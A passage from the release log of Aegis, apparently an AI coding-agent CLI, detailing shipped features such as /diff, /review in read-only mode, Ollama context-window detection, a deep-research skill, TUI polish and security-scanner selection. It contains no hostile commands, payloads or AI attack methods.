synthetic "new file" diff for every untracked file via `git diff --no-index -- /dev/null <file>`
(plain `git diff` omits untracked files entirely; this needed no index mutation like `git add -N`
would have). Rendered through chroma's built-in `diff` lexer (`highlightUnifiedDiff`, a sibling to
the existing `highlightSource`) for `+`/`-`/`@@` coloring, threaded through a `\x00diff` transcript
marker so the rendering happens in `tui.go` where the active theme lives — the same reason
`/theme`/`/clear` use marker passthrough instead of pre-rendering in the dispatcher.
**P22.4** adds Ctrl+R as a filterable, newest-first picker over sent-message history (the existing
`listDialog`/`list.Item` machinery, same as the timeline/model pickers), reusing the list's
built-in fuzzy filter as the actual "search." Ctrl+R was already bound to the session switcher, so
per an explicit user decision that switcher moved to **Ctrl+Y** — `docs/tui-guide.md`,
`docs/sessions.md`, and `/help`'s keybind-only-features line were updated to match. Selecting a
history entry recalls it onto the input line for further editing (does not auto-send), mirroring a
shell reverse-search accept.
**P22.2** adds `/review [--staged | <branch|commit>]`: resolves the target diff (uncommitted,
staged, a branch/tag's merge-base, or a single commit), inlines it into a prompt that loads the
already-shipped `content-review` builtin skill for structured severity-rubric findings, and
switches the session to `plan` (read-only) mode for the duration if it isn't already — real
permission-gate enforcement, reported back with how to switch back afterward. P22.3/P22.5/P22.6
remain open — see
[roadmap.md](roadmap.md#open-work--p22-openai-codex-cli-evaluation--2026-07-08).
**Previously, 2026-07-07:** **P20.1** (deep-research workflow, first of the three adopted
Odysseus-review items) shipped skill-first as scoped: new `deep-research` embedded builtin skill
(`internal/skills/builtin/deep-research/SKILL.md`) encoding a structured research playbook —
scope-the-question first (primary question + 2–5 sub-questions, budgets up front), iterative
plan → search → select → read → record rounds capped at 8 with explicit stop conditions
(saturation, all sub-questions corroborated, cap, or diminishing returns), a source-quality bar
(primary/authoritative preferred, corroborate-only tiers, reject SEO/AI-aggregator pages,
two-independent-sources rule for load-bearing claims), a structured findings log
(`url/title/type+date/summary/evidence/bearing` per source) plus an analyzed-URLs audit trail
including rejected URLs with reasons (kept in a `.aegis/research/<slug>.md` working file on longer
runs so compaction can't destroy it), numbered inline-citation discipline
(single-source claims flagged, contradictions surfaced with both sides cited), and a six-part
report format that can hand off to `html-report`/`latex-report` (`/report`) for a shareable
artifact. New `/research [topic]` TUI command (`commandDefs` entry + `cmdResearch` in
`internal/tui`) — the P13/P20 cross-cutting TUI-surface requirement, automatically covered by the
P14.1/P14.10 command-surface sync tests. Concept-level reimplementation only per the P20 AGPL
constraint — no Odysseus code, prompts, or assets were reused. `TestBuiltinsListsEmbeddedSkills`
want-list extended with `deep-research` (and `latex-report`, which had been missed);
built-in-skills lists in `CLAUDE.md`, `docs/skills.md`, `docs/configuration.md`,
`docs/memory-and-knowledge.md`, and `docs/tui-guide.md`'s command table updated. No persona
changes needed: `skill` is already in every non-debate persona's advisory Tools list (P13.7) and
`web_search`/`web_fetch` already in 19 of 22.
**Previously, 2026-07-07:** **P19** (docs/command misc bucket, both items) shipped: **P19.1**
(skill authoring guide) added `docs/skills.md`, a sibling to `docs/personas.md`/`docs/debate.md`
covering minimal single-file skills, bundled directory skills with a companion script and how the
generated `<skill_assets>` manifest exposes it to the model, frontmatter fields, project/user/
builtin precedence and name collisions, and a worked example — the mechanism was previously fully
built but documented only in code comments. Cross-linked from `docs/README.md`'s table and folded
into `docs/memory-and-knowledge.md`'s now-slimmer Skills section, which also picked up two accuracy
fixes found while writing the guide: the documented user-skills path (`~/.local/share/aegis/
skills/*.md`) didn't match the actual loader (`~/.aegis/skills/*.md`), and the documented memory-load
order had project/user skills reversed relative to the real project-shadows-user precedence.
**P19.2** (manual `/compact`) added a `Summarizer.ForceCompact` (`internal/compaction/
compaction.go`) that runs the same summarization pass as the automatic budget-driven `Compact` but
skips both `shouldCompact` budget checks, a `POST /sessions/{id}/compact` daemon endpoint
(`internal/server/sessions.go`, serialized against an in-flight run via the same per-session
semaphore `/rewind` uses) and TUI `/compact` command, for forcing compaction ahead of a known
tool-heavy stretch rather than waiting for the 85%-fill auto-trigger. Reports "nothing to compact"
(`Compacted: false`) rather than fabricating a summary when the conversation is shorter than
`KeepRecent` messages. Verified no collision with the pre-existing `/tools compact` (an unrelated
`/tools` subcommand toggling tool-output display width, not conversation compaction) — separate
top-level command-table entries, distinct dispatch paths. Tested with new unit tests for
`ForceCompact`'s ignore-budget and too-short-is-noop behavior (`internal/compaction/
compaction_test.go`) and server-level tests exercising the full endpoint round-trip including the
no-compactor-configured error path (`internal/server/server_compact_test.go`).
**Previously, 2026-07-07:** **P13.3.1** (shell-aware error assist) and **P13.3.5** (configurable
keybinding remap) shipped, picked as the two genuinely-valuable P13.3 items (over P13.3.2/P13.3.3,
judged lower-leverage — see [roadmap.md](roadmap.md#p133--terminal-enhancements-microsoft
-intelligent-terminal-review)). P13.3.1 deliberately excludes the `shell` tool itself: a tool call
the model makes already sees its own result on the next turn, so only the two surfaces where the
model has *no* automatic visibility needed a bridge — the embedded terminal pane and `!` bang
commands. New `termPane.beginRun`/`runOutput`/`lastCmd`/`lastOutput`/`lastExitCode`/`lastFailed`
(`internal/tui/terminal.go`) track a run's own output separately from the pane's full scrollback
buffer; `model.lastFailure` (`internal/tui/tui.go`) holds whichever of the two surfaces failed most
recently. `ctrl+g` (the new `Diagnose` binding) sends the failed command + its output as a new user
turn asking the model to diagnose and fix it, via the existing `sendUserMessage` path — same as
typing it by hand, just pre-filled. The terminal pane's status line and the bang-command transcript
entry both show a `<key> diagnose` hint when a command fails, reading the actual bound key rather
than a hardcoded one. P13.3.5 added a `tui.keybindings` config map (action name -> one or more
`bubbles/key` sequences, e.g. `terminal: ["alt+t"]`), applied via a new
`keyMap.applyKeybindings`/`bindingsByName` (`internal/tui/keymap.go`) that regenerates each
overridden binding's help label from its new primary key — so the F1 overlay and `/help` (which
previously always rendered `defaultKeyMap()`, ignoring any override; `SlashDispatcher` now carries
its own `keys` field, set from the model's actual keymap) both stay accurate after a remap. An
unknown action name in `tui.keybindings` is validated at TUI startup (`tui.Run`) and fails with a
named error rather than silently doing nothing.
**Previously, 2026-07-07:** **P17** (adaptive sub-agent concurrency, all 5 items) shipped: new
`internal/swarm/adaptive.go` (`AdaptiveLimiter`) throttles how many agents in a `parallel` workflow
batch run *simultaneously*, separate from the existing `MaxParallelAgents` (8) hard ceiling on how
many an `agents` array may *request*. Starts conservative at the floor (2) and adjusts with an AIMD
scheme driven by measured wall-clock speedup within each batch (`sum(individual durations) /
batch elapsed`) rather than static config or host/GPU introspection — evaluated and rejected
introspecting Ollama's own `OLLAMA_NUM_PARALLEL` heuristic since it isn't exposed via the API and
would mean reimplementing it blind from a fragile `nvidia-smi`/`rocm-smi` proxy signal.
`executeWorkflow`'s `"parallel"` case in `internal/tool/builtin/agent.go` now acquires a limiter slot
per spawn instead of firing every goroutine at once; a spawn error consistent with resource
exhaustion (timeout, connection refused, connection reset, 429) also triggers the same
multiplicative-decrease path as a low-speedup batch. One `AdaptiveLimiter` instance per daemon
process (`Server.agentLimiter`, threaded through a new `WithConcurrencyLimiter` `AgentToolOption`,
constructed alongside `NewAgentTool` in `server.go`) — in-memory only, does not persist across
restarts, since re-converging from the floor costs only a couple of batches. Current cap surfaced on
the existing `GET /status` / `/status` TUI surface (`api.StatusInfo.AgentConcurrency`) rather than a
new endpoint. Tested with deterministic unit tests against injected/synthetic durations (no real
sleeps) for the AIMD transitions, channel-synchronized (not sleep-based) concurrency-gating tests for
`Acquire`/`Release`, and an integration test confirming the `parallel` dispatch itself respects the
cap.
**Previously, 2026-07-07:** **P16.9** (in-terminal image rendering) shipped, closing out the
entire P16 track: new `internal/tui/imagerender.go` renders a half-block ANSI truecolor thumbnail
(upper-half-block trick — each cell's foreground is its top source pixel, background the pixel
below) in the transcript whenever an image attachment is sent, live or replayed from session
history. Gated on terminal capability via `charmbracelet/colorprofile`'s env/`NO_COLOR`/`CLICOLOR`
detection (256-color-or-better only), configurable with new `tui.image_rendering: auto|off`.
Decoding is best-effort — an unreadable path or unsupported format (notably WebP) silently falls
back to the pre-existing text notice. True kitty-graphics/iTerm2-inline-image protocol support was
deliberately descoped: bubbletea/ultraviolet's cell-diffed redraw model has no primitive for opaque
out-of-band terminal state (unlike its OSC-8-hyperlink `Cell.Link` support), and there was no real
kitty/iTerm2 terminal available to verify escape-sequence behavior against — the half-block
fallback needed none of that risk. See
[P16 shipped](releases.md#shipped--p16-items-tui-polish--interaction-parity) below.
**Previously, 2026-07-07:** **P16.8** (clipboard image paste) shipped: new
`internal/tui/clipboard_image.go` reads an image directly off the OS clipboard (not a pasted file
path) into a temp PNG, per-OS the same way `copyToClipboard` already is — `System.Windows.Forms.
Clipboard` + `Bitmap.Save` via an `-Sta` PowerShell call on Windows (verified end-to-end against a
real clipboard image and against clipboard text with no image), `pngpaste` on macOS, `wl-paste`/
`xclip -t image/png` on Linux. New `ctrl+v` keybinding plus a `/paste-image` slash-command fallback
for terminals that intercept ctrl+v themselves; both feed the existing `@image:` attachment-token
path, so no daemon-side changes were needed. See
[P16 shipped](releases.md#shipped--p16-items-tui-polish--interaction-parity) below.
**Previously, 2026-07-07:** **P16.7** (runtime-loadable themes) shipped: new
`internal/tui/theme_loader.go` derives a full `colorScheme` from a `themeFile` JSON schema
(background/foreground + the standard 16-color ANSI palette — the shape most published terminal
color schemes already ship in) by blending, reusing P16.3's `blend()` helper. Four embedded
built-ins (catppuccin, dracula, gruvbox, tokyonight) ship the same way builtin skills do, plus a
loader for project `.aegis/themes/<name>.json` and user `~/.aegis/themes/<name>.json` (project
wins). `/theme` and `tui.theme` now accept any of dark/light/builtin/custom name; an unknown name
lists everything currently resolvable instead of a fixed "want dark or light". See
[P16 shipped](releases.md#shipped--p16-items-tui-polish--interaction-parity) below.
**Previously, 2026-07-07:** **P16.2** (chroma syntax highlighting) and **P16.3** (diff
presentation upgrade) shipped together, as the roadmap's suggested sequencing called for ("one
visual unit"). New `internal/tui/highlight.go`: a `chroma.Style` built from the existing
colorscheme palette (P16.2), applied to diff added/removed/context lines, `read_file` result
blocks (stripping and re-deriving the gutter from the tool's own "N\t" line-number prefix), and
shell-command previews. `diffLines` (`toolview.go`) was rewritten for P16.3: a real line-number
gutter, hunk headers with actual `@@ -a,b +c,d @@` ranges (previously a bare placeholder), tinted
add/removed row backgrounds (`colDiffAddBg`/`colDiffDelBg`, derived by blending the theme's
success/destructive roles into the background so the tint stays on-theme), and word-level
intraline emphasis for single-line replacements (reusing the existing generic LCS `buildEdits` at
word granularity rather than a new diff algorithm). P16.2/P16.3 also fixed a same-session bug
caught before commit: the first hunk-header implementation computed the header only once its hunk's
full extent was known, i.e. *after* emitting that hunk's lines — headers must precede their
content, so hunk boundaries are now precomputed before the render pass. See
[P16 shipped](releases.md#shipped--p16-items-tui-polish--interaction-parity) below.
**Previously, 2026-07-07:** **P16.1** (TUI notifications & attention system) shipped: terminal
bell + OSC 9/777 desktop notification on stream-end/approval-pending/error (suppressed while the
terminal is focused, via bubbletea v2's `tea.FocusMsg`/`BlurMsg`), OSC 0/2 window-title updates
reflecting streaming/ready/approval state, new `tui.notifications` config + `/notify` command.
**Previously, 2026-07-06:** **P15.1** (web UI frontend architecture) shipped: moved `aegis ui`
off the old dependency-free single-file page to a bundled Vite + Preact + TypeScript frontend
(`internal/server/webui/frontend/`), built output committed at `internal/server/webui/dist/` and
embedded via `go:embed` (`internal/server/webui.go`) so `go build`/`go run` still need no Node.js.
Same session ported the prior page's exact feature set 1:1 onto the new stack — no new panels.
P15.2–P15.11 (the rest of the web-UI-parity track) are now unblocked but not started.
**Previously, 2026-07-06:** **P13.2** (trufflehog secret scanner, opt-in alongside gitleaks,
with a host-only-gated live-verification opt-in) shipped. Only P13.3/P13.4/P13.7 remain open in P13.
**Also 2026-07-06:** **P13.6** (`threat-modeling` builtin skill covering STRIDE/LINDDUN/
PASTA/Trike/VAST/NIST 800-154, `/threat-model` TUI command, `security-architect` persona updated to
name the skill) shipped.
**Also 2026-07-06 (user-requested, not a roadmap item):** per-scanner selection + language
auto-detection + persisted reports for `/scan`/`aegis scan`/`security_scan`. `--scanner
<name-or-category>` (CLI, repeatable) / `scanners` (tool JSON) / a `/scan <selector>[,<...>]
[path]` TUI arg now restrict a scan to specific scanners (exact name, e.g. "trufflehog") or a
category alias ("secrets" → gitleaks+trufflehog, "sast", "sca"/"deps", "iac", "misconfig"),
force-enabling the selection for that run regardless of config — same posture `/scan image`
already had for its own distinct scanner set. A plain scan with no selector now also
auto-detects the project's language (go.mod/*.go, requirements.txt/*.py, Gemfile/*.rb,
package.json/*.js) and auto-enables the matching opt-in SAST engine (gosec/bandit/brakeman/
njsscan) for that run — `AutoEnableLanguageScanners` never overrides an explicit
`security.tools.<name>.enabled` either direction, tracked via a new `ToolPolicy.EnabledExplicit`
bit set in `OptionsFromConfig`. Every findings scan (path/image/network/dast, across CLI/TUI/
tool surfaces) is now also persisted as JSON under `.aegis/security/` (`scan.json`/`image.json`/
`network.json`/`dast.json`, overwritten each run — same posture as `.aegis/sbom.cdx.json`),
per an explicit ask that scan results survive past terminal scrollback/a model turn. New
`internal/security/select.go` (`ResolveSelector`/`SelectScanners`/`DetectLanguages`/
`AutoEnableLanguageScanners`) and `report_artifact.go` (`WriteReportArtifact`).
**Also 2026-07-06:** cross-feature integration review of the (then-uncommitted) P13.5/
P13.8 work, same pattern as the 2026-07-05 review: an adversarial fresh-context pass (not a
roadmap-prose re-verification) checking whether `recon_scan`/`red-team` actually wired into every
shared system a comparable feature is expected to. Found and fixed three seam gaps same-day:
(1) nmap findings never got an ASVS label — `buildNmapFinding` never set `Finding.CWE` and
`toolASVS`'s fallback map (`internal/security/asvs.go`) had entries for gitleaks/kubescape/hadolint
but not nmap, so every nmap finding silently carried `ASVS == ""` forever; added `"nmap": "V14
Configuration"` to the fallback map. (2) the `security-audit` skill's triage guidance
(`internal/skills/builtin/security-audit/SKILL.md`) never mentioned `recon_scan`/nmap/nuclei even
though their findings flow through the identical Report/dedup/ASVS pipeline; added a paragraph
pointing at it. (3) `recon_scan`/`aegis scan network` had no TUI or server-API surface at all,
violating the P13 cross-cutting rule that a new capability ships its `/slash` surface in the same
change (this was compounding `dast_scan`'s pre-existing identical gap rather than introducing a new
one) — added `api.ScanRequest.Targets`, a `Server.handleScan` branch calling `security.RunRecon`,
and `/scan network <target...>` (`internal/tui/slash.go`'s `cmdScan`, registered in the existing
P14.10 `commandDefs` table), with tests at both the server (`internal/server/scan_test.go`:
disallowed-target 400, allowed-target routing) and TUI (`internal/tui/scan_test.go`: bare-args usage
error) layers, plus a `docs/security.md` mention. `dast_scan`/`aegis scan dast` itself still has no
`/scan dast` TUI surface — a real, separate pre-existing gap, not addressed here since it wasn't
part of the audited new work; worth a future item if `dast_scan` needs the same treatment. The
red-team persona's five-phase self-critique loop was also noted as a hand-rolled duplicate of
`internal/debate`'s propose/critique/rebut/arbitrate primitive (not integrated) — flagged as a
missed-reuse opportunity, not fixed (single-agent self-review vs. multi-agent debate are different
shapes; revisit only if there's a concrete reason to unify them).
**Also 2026-07-06:** **P13.1.3** (opt-in bulk security-tool install, Action [3] in all
three build scripts, looping the existing `aegis security install <tool> --yes` over every scanner
descriptor) shipped.
**Also 2026-07-06:** **P13.5** (Nuclei + nmap network/host recon scanning, `recon_scan`/
`aegis scan network`) and **P13.8** (`red-team` persona + `redteam-engagement` skill built on top
of it, prompted by a user review of `elder-plinius/T3MP3ST`) shipped. P13.5.2's generalized
target-authorization gate (`internal/security/target.go`) now backs both `dast_scan` and
`recon_scan` — one shared policy, not two. Only P13.2/P13.3/P13.4/P13.6/P13.7 remain open in P13.
**Also 2026-07-06:** **P14.7** (`/model <id>` mid-session model switch) shipped. This one
needed real plumbing, not just a UI wrapper: added a genuine per-session model override (new
`sessions.model` column, `Store.SetModel`, `PATCH /sessions/{id}` field, `Server.resolveModel`
layered on top of the existing `personaModel`) since no such override existed anywhere before —
switching model previously required a model-pinning persona or a full restart.
**Also 2026-07-06:** **P14.8** (`/theme <dark|light>` live color-scheme switch — required explicitly
rebuilding `m.th` and the glamour renderer, since rebinding the scheme's package vars alone doesn't
repaint anything already built from them) and **P14.9** (folded the keymap into `/help`'s general
listing, deduplicated against the pre-existing F1 overlay via a new shared `keyMap.helpEntries()`)
shipped, closing out the entire P14 track — no open items remain in it.
**Also 2026-07-06:** **P14.6** (`/bundle [install|info <path-or-url>]`, reusing the P7.6
content-hash provenance flow and the `/security install` confirm-gating shape) and **P14.4**
(session/run/background lifecycle surface: `/archive list`, `/prune [days]`, `/runs`, `/bg
[list|events]`) shipped, both registering into the P14.10 `commandDefs` table.
**Previously, 2026-07-05:** cross-feature integration review (roadmap + codebase, focused on
seams between features rather than individual gaps) found and fixed two items same-day: **P14.1**
(completion/palette list drift — the reported bug) and **P14.10** (single source-of-truth command
table, the structural fix for that whole drift class), both shipped. The review also surfaced an
undocumented instance of the same "new capability skips a shared seam" pattern outside the TUI:
**/debate bypassed the P9.5/P10.5 daily cost/token caps** entirely and never recorded its spend to
the ledger — fixed same-day (see Appendix A). **P14.2** (in-session `/security` surface),
**P14.3** (in-session `/knowledge`/`/index`), and **P14.5** (`/status` daemon/session health,
including a new `GET /status` daemon endpoint surfacing the P9.5/P10.5 daily-spend totals that
existed in the store but were never read back out anywhere) also shipped same-day, registering into
the new P14.10 table.
P12 (multi-agent debate mode for security analysis), all 7 items, shipped. P6.3 (MCP server mode)
shipped; P6.2 (A2A), P9.3 (telemetry export), and P9.6 (bulk session/memory export-import)
evaluated and dropped, not wanted. P13 (7 exploratory items) fully researched and scoped into
concrete sub-items; P13.1, P13.5, and P13.8 (added after initial scoping) now shipped.
Full change history and design rationale for every shipped item lives below in
[Appendix A](#appendix-a--completed-work).

---

## Shipped — P23 items (Local-Model Context-Window Truth & Long-Run Survivability)

Shipped 2026-07-08, from a user-reported field failure: a threat-model run on an
Ollama-backed machine ingested a large codebase and then "just stopped and didn't write
anything down." Root cause was a three-layer disagreement about the context window. Aegis
talks to Ollama through its OpenAI-compatible endpoint, which offers no way to set or read
`num_ctx`; when a prompt exceeds the served context (default **4096** tokens), Ollama
**silently drops the oldest tokens — system prompt and task instructions first** — so the
model literally forgets what it was doing. Meanwhile Aegis either disabled compaction
entirely (`provider.default: ollama` + `context_window: 0` set `MaxBudget = 0`) or used the
meaningless 120k default budget (`openai` provider pointed at `localhost:11434/v1`), and the
TUI context bar divided by a name-based guess (128k for unknown models) that showed "3%" at
the moment truncation began.

- **P23.1 — Ollama context-window detection** (`internal/ollamainfo`, new): when the provider
  is `ollama` — or `openai` with a `base_url` that answers Ollama's native `GET /api/version`
  probe — the daemon resolves the *effective* served window in order of authority:
  `/api/ps context_length` for the loaded model (authoritative) → modelfile-pinned `num_ctx`
  from `/api/show` → Ollama's 4096 default capped by the model's training context. Detection
  runs at startup and re-runs after each completed run until authoritative (the first run is
  what loads the model into Ollama). Reconciliation (`internal/server/contextwindow.go`): an
  unset `context_window` takes the detected value; a configured value wins over a guess but
  **loses to a verified smaller served window** (with a logged warning naming
  `OLLAMA_CONTEXT_LENGTH`/`num_ctx` as the fix) — honoring the larger config would just
  reintroduce silent truncation. The effective value now drives the compactor
  (`Summarizer.SetContextWindow`, atomic, retunable after late detection), the engine's
  proactive 85% per-turn compaction (previously off for exactly these local sessions), the
  TUI usage bar (`/status`-fed, replacing the name-table guess), and `/status` (value +
  provenance, with a raise-your-context hint when serving the assumed default).
- **P23.2 — visible context/step notices** (engine `KindNotice` → api/SSE `"notice"` → TUI
  dim ⚠ line): proactive compaction now announces itself ("context ~N% full — compacted
  X→Y messages"); a ≥95%-full context with nothing left to compact warns once per run that
  the model server may silently drop older turns; and hitting `max_iterations` (default 40
  tool rounds) — a second, previously-invisible way long agent tasks died with work unwritten
  — now says so and names the config key to raise.
- **P23.3 — incremental threat-model writing** (`threat-modeling` SKILL.md §4/§5/§7 rewrite):
  skeleton document written to disk *first* (header, component map, every framework section
  as `<!-- PENDING -->`), each section written the moment its analysis completes, resume-from-
  pending-markers on re-run, and the P12 debate round moved from per-entry-mid-flight to a
  final whole-document review pass (cross-section consistency, severity-floor recheck, then
  debate only the contested entries and patch verdicts back). An interrupted run now leaves
  every completed section on disk instead of losing everything held in conversation.

Tested: `internal/ollamainfo` httptest-fake Ollama covering ps/modelfile/default/cap
precedence and non-Ollama rejection; engine tests for both notice paths (compaction notice,
warn-once no-compactor); server reconciliation tests including the user's real deployment
shape (`openai` provider + Ollama base URL) and the post-run authoritative upgrade. Docs:
`docs/providers.md` Context Window section rewritten (detection order, `OLLAMA_CONTEXT_LENGTH`
guidance, 16k–32k minimum for agent workloads), `docs/configuration.md` `context_window`
comment. Known limitation: detection is daemon-global keyed to the configured model; per-run
`BudgetUSD`/`MaxTokensPerRun` remain off by default and were confirmed *not* the failure
mechanism.

---

## Shipped — P22 items (OpenAI Codex CLI evaluation: `/diff`, Ctrl+R history search, `/review`)

Three of the six items scoped from the 2026-07-08 Codex CLI feature evaluation, per
[roadmap.md](roadmap.md#open-work--p22-openai-codex-cli-evaluation--2026-07-08). P22.3 (Esc-Esc
backtrack + `/fork`), P22.5 (`/side`), and P22.6 (raw scrollback) remain open.

### P22.1 — SHIPPED 2026-07-08 — `/diff` command

- New `internal/tui/slash_diff.go`: `cmdDiff` runs directly against the TUI process's own workspace
  (`d.workDir`), consistent with `/sandbox`/`/security-config` rather than a daemon round trip, and
  spends no model turn — same posture as `/scan`.
  - Default: `git diff HEAD` (staged + unstaged tracked changes) plus a synthetic diff for each
    untracked file, found via `git ls-files --others --exclude-standard` and rendered with
    `git diff --no-index -- /dev/null <file>` — chosen over `git add -N` so a read-only command
    never mutates the index.
  - `--staged`/`--cached`: only the index diff; untracked files are excluded since they can't be
    staged without first adding them.
  - Optional trailing `<path>` scopes either mode to a workspace-relative file/directory.
  - `runGitDiff` treats `git diff`'s exit code 1 (differences found) as success — only exit codes
    >1, or git failing to start at all, are surfaced as errors.
- New `highlightUnifiedDiff` (`internal/tui/highlight.go`), a sibling to the existing
  `highlightSource`: tokenizes the raw diff text with chroma's built-in `diff` lexer (`lexers.Get
  ("diff")`, matched by name rather than by file-extension `Match`, since a diff has no path) so
  `+`/`-`/`@@` lines get the same `GenericInserted`/`GenericDeleted`/`GenericSubheading` theme roles
  used elsewhere, rather than trying to per-file-language-highlight a multi-file diff. Both
  functions now share a `highlightWithLexer` tokenize/render core.
- Result plumbing: `cmdDiff` returns the raw diff text behind a `\x00diff\n` marker (`SlashResult
  .Output`) rather than pre-rendering, since the dispatcher has no theme reference — `tui.go`'s
  `Update` intercepts the marker, calls `highlightUnifiedDiff(m.th, …)`, and appends the result
  un-wrapped (not through `style.Render`, which would double-style already-ANSI'd text) — the same
  marker-passthrough convention `/theme`/`/clear`/`/notify` already use.
- New `commandDefs` entry (`internal/tui/commands.go`) — automatically covered by the P14.1/P14.10
  command-surface sync tests.
- Tests: `internal/tui/slash_diff_test.go` (tracked+untracked combined diff, `--staged` excludes
  untracked, no-changes case, non-git-directory error) against real `exec.Command("git", …)` scratch
  repos (same pattern as `internal/tool/builtin/git_test.go`), plus `highlight_test.go` additions
  covering `highlightUnifiedDiff`'s ANSI output and its empty-source `ok=false` case.

### P22.4 — SHIPPED 2026-07-08 — Ctrl+R input-history search

- New `internal/tui/historypicker.go`: `historyItem`/`newHistoryPicker` build a `listDialog`
  (the same shared filterable-list overlay backing the palette/persona/session/timeline/model
  pickers, P16.6) over `m.history`, newest-first, with the list's built-in fuzzy filter serving as
  the actual incremental "search" — typing narrows the list exactly like a shell reverse-i-search.
  New `dialogHistoryPicker` `dialogKind` and a `dialogSelectedMsg` case in `tui.go` that recalls the
  selected entry onto the input line (`m.ta.SetValue`) without sending it, matching a shell
  reverse-search accept rather than an immediate submit.
- **Keybinding conflict, resolved by explicit user decision:** Ctrl+R was already bound to the
  session switcher (documented in `/help` and `docs/tui-guide.md`/`docs/sessions.md`). Rather than
  picking an unfamiliar key for the new feature, the session switcher moved to **Ctrl+Y** (new
  `HistorySearch` `keyMap` field bound to `ctrl+r`; `Sessions` field rebound to `ctrl+y`), and all
  three docs plus `/help`'s keybind-only-features line were updated to match. `ctrl+r` with an empty
  history shows a toast ("no input history yet") instead of opening an empty dialog.
- Tests: `internal/tui/historypicker_test.go` drives the real `model.Update()` path (not a mock) —
  Ctrl+R opens the picker newest-first, Ctrl+R with empty history shows a toast and opens nothing,
  selecting an entry recalls it onto the input without sending, and Ctrl+Y still triggers the
  session-switcher fetch.

### P22.2 — SHIPPED 2026-07-08 — `/review` read-only review mode

- New `cmdReview` in `internal/tui/slash_diff.go`, alongside `/diff` since it shares the same
  target-resolution and git plumbing. Unlike `/diff`, this spends a model turn: it inlines the
  resolved diff into a prompt that loads the already-shipped `content-review` builtin skill
  (structured severity-rubric findings — this made a from-scratch reviewer persona/debate-trio
  unnecessary, since the skill already covers diff/PR review end to end) and sends it as a normal
  message in the current session, so streaming/approval/cost tracking all work exactly as any other
  turn's do.
  - `/review` (no args): the uncommitted working-tree diff, same scope `/diff`'s default uses
    (`git diff HEAD` plus a synthetic diff per untracked file).
  - `/review --staged`/`--cached`: only the staged (index) diff.
  - `/review <branch-or-tag>`: diff against the merge-base with that ref (`reviewRefDiff` +
    `refIsNamed`, which checks `refs/heads/`, `refs/remotes/`, and `refs/tags/` via
    `git show-ref --verify --quiet`) — "what would this PR change" against the ref's history rather
    than its current tip.
  - `/review <commit>`: that single commit's own diff (`git diff <ref>^ <ref>`, falling back to
    `git show <ref>` for a root commit with no parent).
  - A ref argument is validated with `git rev-parse --verify --quiet <ref>^{commit}` first — via a
    new `runGit` helper (unlike `runGitDiff`, exit code 1 is a real error here, not "differences
    found") — so an invalid ref is reported as a usage error rather than silently falling through.
  - The diff is capped at `maxReviewDiffChars` (200,000 runes) before inlining, since unlike `/diff`
    (rendered locally, no model involved) this diff becomes part of the conversation's context — a
    truncation note is appended to the prompt when the cap is hit.
- **Read-only enforcement:** if the session isn't already in `plan` mode, `cmdReview` switches it
  there via `UpdateSession` before sending the review message (same mechanism `/persona`'s
  mode-changing switch already uses) and reports the switch plus how to switch back — real
  permission-gate enforcement, not persona-advisory. Deliberately does not attempt to auto-restore
  the prior mode after the turn completes; no such per-turn hook exists in the current dispatch
  architecture, and `/mode <prev>` is one command away.
- New `commandDefs` entry — automatically covered by the P14.1/P14.10 command-surface sync tests.
  `docs/tui-guide.md` gained rows for both `/review` and the previously-undocumented `/diff` (a
  P22.1 gap caught while updating the same table).
- Tests: `internal/tui/slash_diff_test.go` additions covering no-changes, working-tree/`--staged`/
  branch/commit target resolution (asserting the prompt's scope description and inlined diff
  content), invalid-ref and conflicting-args usage errors, and the non-git-directory case — all via
  `reviewDispatcher`, which starts in `plan` mode specifically so these tests exercise the
  diff-gathering/prompt-building logic without touching the (nil in tests) daemon client through the
  mode-switch branch.
- P22.3/P22.5/P22.6 remain open.

---

## Shipped — P20 items (Odysseus Review: Research, Compare, Model Fit)

Three capabilities adopted from the 2026-07-07 review of the Odysseus self-hosted AI workspace
(github.com/pewdiepie-archdaemon/odysseus); P20.2 (blind model compare) and P20.3 (hardware-aware
model recommendation) are still open — see
[roadmap.md](roadmap.md#open-work--p20-odysseus-review-research-compare-model-fit). Everything
here is concept-level reimplementation per the track's AGPL-3.0 constraint: no Odysseus code,
prompt, or asset reuse.

### P20.1 — SHIPPED 2026-07-07 — Deep-research skill (`deep-research`) + `/research` command

Aegis had every primitive a research task needs (web_search/web_fetch, the engine loop, budget
enforcement, html-report/latex-report for output) but no structured workflow over them — "research
X" was unguided tool-looping: ad-hoc searches, whichever pages happened to load, and a summary
whose claims couldn't be traced to any source. Built skill-first as scoped (cheapest path, zero
engine change), keeping the escalation path open: promote to an engine-level workflow only if
skill-driven runs prove insufficient, and fold a web UI research panel into P15 later.

- New `internal/skills/builtin/deep-research/SKILL.md` (embedded builtin, dormant by default like
  the other eight), encoding the workflow the P20 research scoped as a playbook:
  - **Scope before searching** — restate the request as a primary question plus 2–5 sub-questions,
    define what a complete answer contains, set budgets up front (hard cap of 8 rounds, ~5–12
    quality sources), and distinguish uncited background knowledge from sourced findings.
  - **Structured rounds** — plan → search (1–3 varied `web_search` queries) → select (quality bar
    applied to snippets *before* fetching) → read (`web_fetch`, raising `max_chars` for
    load-bearing pages) → record; with explicit stop conditions (all sub-questions corroborated,
    saturation, round cap, or remaining gaps not worth the budget — named, not silently hit).
  - **Findings log + audit trail** — one structured `url/title/type+date/summary/evidence/bearing`
    record per contributing source, plus a `kept/rejected — reason` line for *every* URL examined;
    kept in a `.aegis/research/<topic-slug>.md` working file on multi-round runs so context
    compaction can't destroy exactly the state a long run depends on.
  - **Source-quality bar** — primary/authoritative sources preferred; forums/Q&A/uncredentialed
    blogs are corroborate-only, never citable alone; SEO farms, AI-aggregator pages, and
    undated/unattributed listicles rejected outright; load-bearing claims need two *independent*
    sources; publication dates noted and staleness flagged.
  - **Citation discipline + report format** — numbered inline `[n]` markers on every non-obvious
    claim, single-source claims flagged as such, contradictions surfaced with both sides cited;
    final report is question/answer-TL;DR/findings/contradictions-and-open-questions/sources/audit
    -trail, delivered as markdown with an offered hand-off to `html-report`/`latex-report`
    (`/report`) for a shareable artifact.
- New `/research [topic or question]` TUI command (`commandDefs` entry in
  `internal/tui/commands.go`, handler `cmdResearch` in `internal/tui/slash.go`) — the same
  cross-cutting TUI-surface requirement every P13/P20 item follows; sends a message that explicitly
  invokes the skill (asking what to research when called bare) instead of relying on the model
  noticing a trigger phrase. Automatically covered by the P14.1/P14.10 command-surface sync tests
  since it's a `commandDefs` entry.
- `TestBuiltinsListsEmbeddedSkills` (`internal/skills/skills_test.go`) want-list extended with
  `deep-research` — and `latex-report`, which P13.7 had missed adding.
